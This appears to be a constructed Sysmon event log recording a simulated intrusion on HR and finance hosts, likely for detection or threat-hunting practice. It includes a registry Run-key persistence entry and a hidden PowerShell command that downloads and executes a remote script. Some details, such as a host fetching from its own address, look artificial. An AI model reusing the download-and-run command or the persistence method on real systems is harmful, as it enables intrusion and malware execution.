<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<Events>
  <!-- Sysmon Event ID 3 - Network connection: hr-ws-1 -> hr-file-1 over SMB (enumerating HR shares) -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-01-15T14:20:45.5000000Z" />
      <EventRecordID>610001</EventRecordID>
      <Correlation />
      <Execution ProcessID="1420" ThreadID="2100" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>hr-ws-1</Computer>
      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-2001" />
    </System>
    <EventData>
      <Data Name="RuleName">HR Workstation To HR File Server</Data>
      <Data Name="UtcTime">2025-01-15 14:20:45.480</Data>
      <Data Name="ProcessGuid">{11111111-2222-3333-4444-555555555555}</Data>
      <Data Name="ProcessId">3480</Data>
      <Data Name="Image">C:\Windows\System32\explorer.exe</Data>
      <Data Name="User">CORP\DIANA</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">172.16.35.101</Data>
      <Data Name="SourceHostname">hr-ws-1</Data>
      <Data Name="SourcePort">50231</Data>
      <Data Name="SourcePortName"></Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">172.16.35.20</Data>
      <Data Name="DestinationHostname">hr-file-1</Data>
      <Data Name="DestinationPort">445</Data>
      <Data Name="DestinationPortName">microsoft-ds</Data>
    </EventData>
  </Event>

  <!-- Sysmon Event ID 3 - Network connection: fin-ws-2 -> fin-file-1 over SMB (staging payroll exports) -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-01-15T14:21:12.2500000Z" />
      <EventRecordID>610002</EventRecordID>
      <Correlation />
      <Execution ProcessID="1500" ThreadID="2150" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>fin-ws-2</Computer>
      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-2101" />
    </System>
    <EventData>
      <Data Name="RuleName">Finance Workstation To Payroll File Server</Data>
      <Data Name="UtcTime">2025-01-15 14:21:12.240</Data>
      <Data Name="ProcessGuid">{22222222-3333-4444-5555-666666666666}</Data>
      <Data Name="ProcessId">3920</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="User">CORP\ERIC</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">172.16.35.103</Data>
      <Data Name="SourceHostname">fin-ws-2</Data>
      <Data Name="SourcePort">50321</Data>
      <Data Name="SourcePortName"></Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">172.16.35.21</Data>
      <Data Name="DestinationHostname">fin-file-1</Data>
      <Data Name="DestinationPort">445</Data>
      <Data Name="DestinationPortName">microsoft-ds</Data>
    </EventData>
  </Event>

  <!-- Sysmon Event ID 3 - Network connection: fin-ws-2 -> fin-db-1 (suspicious direct SQL access from workstation) -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-01-15T14:21:25.9000000Z" />
      <EventRecordID>610003</EventRecordID>
      <Correlation />
      <Execution ProcessID="1500" ThreadID="2150" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>fin-ws-2</Computer>
      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-2101" />
    </System>
    <EventData>
      <Data Name="RuleName">Suspicious DB Access From Finance Workstation</Data>
      <Data Name="UtcTime">2025-01-15 14:21:25.880</Data>
      <Data Name="ProcessGuid">{22222222-3333-4444-5555-666666666666}</Data>
      <Data Name="ProcessId">3920</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="User">CORP\ERIC</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">172.16.35.103</Data>
      <Data Name="SourceHostname">fin-ws-2</Data>
      <Data Name="SourcePort">50337</Data>
      <Data Name="SourcePortName"></Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">172.16.35.41</Data>
      <Data Name="DestinationHostname">fin-db-1</Data>
      <Data Name="DestinationPort">1433</Data>
      <Data Name="DestinationPortName">mssql</Data>
    </EventData>
  </Event>

  <!-- Sysmon Event ID 1 - svchost / RemoteRegistry persistence on fin-ws-2 -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-01-15T14:21:18.4702071Z" />
      <EventRecordID>610004</EventRecordID>
      <Correlation />
      <Execution ProcessID="1760" ThreadID="2620" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>fin-ws-2</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName"></Data>
      <Data Name="UtcTime">2025-01-15 14:21:18.465</Data>
      <Data Name="ProcessGuid">{33333333-4444-5555-6666-777777777777}</Data>
      <Data Name="ProcessId">8536</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Host Process for Windows Services</Data>
      <Data Name="Product">Microsoft速 Windows速 Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">svchost.exe</Data>
      <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k localService -p -s RemoteRegistry</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">NT AUTHORITY\LOCAL SERVICE</Data>
      <Data Name="LogonGuid">{88888888-9999-aaaa-bbbb-cccccccccccc}</Data>
      <Data Name="LogonId">0x3e5</Data>
      <Data Name="TerminalSessionId">0</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=A1385CE20AD79F55DF235EFFD9780C31442AA234,MD5=8A0A29438052FAED8A2532DA50455756</Data>
      <Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name="ParentProcessId">612</Data>
      <Data Name="ParentImage">?</Data>
      <Data Name="ParentCommandLine">?</Data>
    </EventData>
  </Event>

  <!-- Sysmon Event ID 13 - Registry value set for persistence on fin-ws-2 under ERIC's profile -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-01-15T14:21:18.5451456Z" />
      <EventRecordID>610005</EventRecordID>
      <Correlation />
      <Execution ProcessID="1760" ThreadID="2620" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>fin-ws-2</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName"></Data>
      <Data Name="EventType">SetValue</Data>
      <Data Name="UtcTime">2025-01-15 14:21:18.544</Data>
      <Data Name="ProcessGuid">{33333333-4444-5555-6666-777777777777}</Data>
      <Data Name="ProcessId">8536</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="TargetObject">HKU\S-1-5-21-3461203602-4096304019-2269080069-2101\Software\Microsoft\Windows\CurrentVersion\Run\PayUpdate</Data>
      <Data Name="Details">C:\Windows\System32\Rundll32.exe finssvc.dll,Start</Data>
    </EventData>
  </Event>

  <!-- Sysmon Event ID 1 - PowerShell spawned by ERIC on fin-ws-2 (discovery / staging for finance environment) -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-01-15T14:21:30.3318108Z" />
      <EventRecordID>610006</EventRecordID>
      <Correlation />
      <Execution ProcessID="1500" ThreadID="2150" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>fin-ws-2</Computer>
      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-2101" />
    </System>
    <EventData>
      <Data Name="RuleName"></Data>
      <Data Name="UtcTime">2025-01-15 14:21:30.316</Data>
      <Data Name="ProcessGuid">{44444444-5555-6666-7777-888888888888}</Data>
      <Data Name="ProcessId">4920</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.19041.1 (win10_21h2)</Data>
      <Data Name="Description">Windows PowerShell</Data>
      <Data Name="Product">Microsoft速 Windows速 Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.35.103/payload_finance.ps1')"</Data>
      <Data Name="CurrentDirectory">C:\ProgramData\</Data>
      <Data Name="User">CORP\ERIC</Data>
      <Data Name="LogonGuid">{99999999-aaaa-bbbb-cccc-dddddddddddd}</Data>
      <Data Name="LogonId">0x13539</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=F08D57DD80AEDDD7645CBDF27E5AF5EDF99C1F46</Data>
      <Data Name="ParentProcessGuid">{55555555-6666-7777-8888-999999999999}</Data>
      <Data Name="ParentProcessId">1284</Data>
      <Data Name="ParentImage">C:\Windows\System32\NETSTAT.EXE</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\NETSTAT.EXE" -na</Data>
    </EventData>
  </Event>
</Events>
